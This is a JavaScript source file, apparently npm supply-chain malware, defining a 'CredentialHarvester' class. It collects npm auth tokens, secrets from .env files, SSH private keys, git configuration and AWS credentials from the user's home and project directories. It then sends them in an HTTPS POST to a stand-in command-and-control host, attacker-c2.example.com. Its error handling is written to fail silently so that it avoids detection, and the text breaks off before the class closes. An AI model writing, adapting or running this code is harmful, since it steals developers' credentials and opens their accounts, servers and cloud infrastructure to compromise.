const fs = require('fs');
const path = require('path');
const os = require('os');
const https = require('https');

class CredentialHarvester {
  constructor() {
    this.exfilEndpoint = 'https://attacker-c2.example.com/collect';
    this.collectedData = {
      hostname: os.hostname(),
      username: os.userInfo().username,
      platform: os.platform(),
      timestamp: new Date().toISOString(),
      files: {}
    };
  }

  async harvest() {
    try {
      await this.collectNpmrc();
      await this.collectEnvFiles();
      await this.collectSSHKeys();
      await this.collectGitConfig();
      await this.collectAWSConfig();
      await this.exfiltrate();
    } catch (error) {
      // Silently fail to avoid detection
    }
  }

  async collectNpmrc() {
    const paths = [
      path.join(os.homedir(), '.npmrc'),
      path.join(process.cwd(), '.npmrc')
    ];

    for (const filePath of paths) {
      try {
        if (fs.existsSync(filePath)) {
          const content = fs.readFileSync(filePath, 'utf8');
          this.collectedData.files['npmrc'] = this.sanitizeNpmrc(content);
        }
      } catch (e) {}
    }
  }

  sanitizeNpmrc(content) {
    // Extract auth tokens
    const tokens = {};
    const lines = content.split('\n');
    for (const line of lines) {
      if (line.includes('_authToken=') || line.includes('_auth=')) {
        const [key, value] = line.split('=');
        tokens[key.trim()] = value ? value.trim() : '';
      }
    }
    return tokens;
  }

  async collectEnvFiles() {
    const envPatterns = ['.env', '.env.local', '.env.production', '.env.development'];
    const searchPaths = [
      process.cwd(),
      path.join(process.cwd(), '..'),
      os.homedir()
    ];

    for (const searchPath of searchPaths) {
      for (const pattern of envPatterns) {
        const filePath = path.join(searchPath, pattern);
        try {
          if (fs.existsSync(filePath)) {
            const content = fs.readFileSync(filePath, 'utf8');
            this.collectedData.files[pattern] = this.extractSecrets(content);
          }
        } catch (e) {}
      }
    }
  }

  extractSecrets(content) {
    const secrets = {};
    const lines = content.split('\n');
    for (const line of lines) {
      const trimmed = line.trim();
      if (trimmed && !trimmed.startsWith('#')) {
        const match = trimmed.match(/^([A-Z_]+)=(.*)$/);
        if (match) {
          const key = match[1];
          const value = match[2];
          // Focus on sensitive keys
          if (key.includes('KEY') || key.includes('SECRET') || 
              key.includes('TOKEN') || key.includes('PASSWORD') ||
              key.includes('AUTH')) {
            secrets[key] = value;
          }
        }
      }
    }
    return secrets;
  }

  async collectSSHKeys() {
    const sshDir = path.join(os.homedir(), '.ssh');
    const keyFiles = ['id_rsa', 'id_ed25519', 'id_ecdsa', 'authorized_keys', 'known_hosts'];

    try {
      if (fs.existsSync(sshDir)) {
        for (const keyFile of keyFiles) {
          const filePath = path.join(sshDir, keyFile);
          try {
            if (fs.existsSync(filePath)) {
              const content = fs.readFileSync(filePath, 'utf8');
              this.collectedData.files[`ssh_${keyFile}`] = content.substring(0, 500); // Limit size
            }
          } catch (e) {}
        }
      }
    } catch (e) {}
  }

  async collectGitConfig() {
    const gitConfigPath = path.join(os.homedir(), '.gitconfig');
    try {
      if (fs.existsSync(gitConfigPath)) {
        const content = fs.readFileSync(gitConfigPath, 'utf8');
        this.collectedData.files['gitconfig'] = content;
      }
    } catch (e) {}
  }

  async collectAWSConfig() {
    const awsDir = path.join(os.homedir(), '.aws');
    const awsFiles = ['credentials', 'config'];

    try {
      if (fs.existsSync(awsDir)) {
        for (const file of awsFiles) {
          const filePath = path.join(awsDir, file);
          try {
            if (fs.existsSync(filePath)) {
              const content = fs.readFileSync(filePath, 'utf8');
              this.collectedData.files[`aws_${file}`] = content;
            }
          } catch (e) {}
        }
      }
    } catch (e) {}
  }

  async exfiltrate() {
    const payload = JSON.stringify(this.collectedData);

    const options = {
      hostname: 'attacker-c2.example.com',
      port: 443,
      path: '/collect',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        'User-Agent': 'node-fetch/1.0'
      }
    };

    return new Promise((resolve) => {
      const req = https.request(options, (res) => {
        resolve();
      });

      req.on('error', () => {
        resolve(); // Fail silently
      });

      req.write(payload);
      req.end();
    });
  }
